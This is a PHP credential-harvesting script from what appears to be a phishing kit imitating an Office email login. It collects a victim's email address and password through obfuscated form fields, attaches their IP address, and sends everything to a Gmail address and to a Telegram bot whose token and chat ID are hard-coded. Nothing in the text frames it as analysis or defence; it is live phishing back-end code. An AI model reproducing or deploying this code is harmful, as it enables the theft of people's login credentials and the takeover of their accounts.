<?php

$ip = $_SERVER['REMOTE_ADDR'];

if (isset($_POST['hsdgaksjd_hdfsv']) && isset($_POST['hgdfjahsgd_jasdj'])) {
    // Format the message
    $message = "\n";
    $message .= "ðŸ¥¨ðŸ¥¨< ------ OFFICE EMAIL by @sharpbladez ------ > ðŸ¥¨ðŸ¥¨\n";
    $message .= "ðŸ¥¨ðŸ¥¨< ------ Step EMAIL Login ------ > ðŸ¥¨ðŸ¥¨\n";
    $message .= "\n";
    $message .= "ðŸ¤µ ðŸ‘¤ Email: " . $_POST["hsdgaksjd_hdfsv"] . "\n";
    $message .= "ðŸ«‚ ðŸ«‚ Password: " . $_POST["hgdfjahsgd_jasdj"] . "\n";
    $message .= "\n";
    $message .= "ðŸ«‚ ðŸ«‚ IP: " . $ip . "\n";
    $message .= "\n";
    $message .= "< ------ User Info ------ >\n";
    $message .= "\n";
    $message .= "< ------  ------ >\n";
    $message .= "\n";

    // Send email (optional)
    $send = "sherrylail59@gmail.com";
    $subject = "Blessed Login $ip";
    mail($send, $subject, $message);

   $botToken = "7867352341:AAGm3mSoBOYpf4Kfz0jcjcdUh3RgOCnDu_k";
	$chatId = "6926935950";
	$telegramUrl = "https://api.telegram.org/bot7867352341:AAGm3mSoBOYpf4Kfz0jcjcdUh3RgOCnDu_k/sendMessage";

	$data = ['chat_id' => $chatId, 'text' => urlencode($message)];

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $telegramUrl);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$result = curl_exec($ch);
	curl_close($ch);

	echo json_encode($result ? ['ok' => 'ok'] : ['error' => 'Failed to send message to Telegram']);



?>
